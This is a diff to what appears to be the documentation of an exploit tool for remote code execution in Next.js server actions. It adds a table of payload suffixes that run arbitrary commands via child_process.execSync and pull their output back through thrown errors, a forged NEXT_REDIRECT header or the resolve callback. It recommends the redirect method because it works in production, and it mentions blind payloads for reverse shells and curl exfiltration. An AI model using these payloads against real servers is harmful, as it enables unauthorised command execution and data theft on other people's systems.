@@ -306,20 +306,20 @@ The vulnerability exploits the combination of `$@` (raw reference) and colon-del
 12. Next.js catches redirect, sets `x-action-redirect` header before URL validation
 13. HTTP 303 returned to attacker with output in header
 
-### Why the Hang?
+### Output Capture Strategies
 
-The original exploit constructs:
+The constructed Function is called as a thenable: `fn(resolve, reject)`. How we handle this determines whether we get output back:
 
-```javascript
-Function("process.mainModule.require('child_process').execSync('CMD');0")
-```
+| Strategy | Payload Suffix | How It Works |
+|----------|---------------|--------------|
+| **Blind** | `execSync('CMD');0` | Executes but never resolves - connection hangs, no output |
+| **Throw** | `throw execSync('CMD').toString()` | Rejects Promise, output in error body (dev mode only) |
+| **Redirect** | `throw {digest:'NEXT_REDIRECT;...;'+b64(output)}` | Abuses Next.js redirect handling, output in header |
+| **Reflect** | `arguments[0]([execSync('CMD').toString()])` | Resolves Promise with output as action argument |
 
-When JavaScript calls this as a thenable - `fn(resolve, reject)` - the function body runs, but it never calls `resolve()` or `reject()`. The Promise stays pending forever, and `await` hangs indefinitely.
+**Recommended: Redirect.** Works in production, no prerequisites, output in `x-action-redirect` header.
 
-Our exfiltration methods solve this:
-- **Throw method:** `throw output` rejects the Promise, surfacing output in the error
-- **Redirect method:** Throws a `NEXT_REDIRECT` error with output encoded in the redirect URL
-- **Reflect method:** Calls `arguments[0](output)` (the resolve callback) to return output as the action result
+The blind approach hangs because the Promise never settles - `await` blocks forever. This is useful for fire-and-forget scenarios (reverse shells, out-of-band exfil via `curl`).
 
 ## Production vs Development
 
